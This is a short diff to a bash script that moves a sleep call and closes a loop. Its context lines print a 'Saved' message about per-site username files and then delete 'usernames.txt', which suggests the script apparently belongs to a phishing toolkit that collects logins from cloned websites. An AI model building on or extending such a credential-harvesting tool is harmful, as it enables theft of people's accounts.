@@ -369,8 +369,10 @@ printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites
 printf "\n"
 rm -rf websites/$server/usernames.txt
 fi
-sleep 0.75
 printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
+sleep 0.75
+
+done
 
 }
 start_l() {
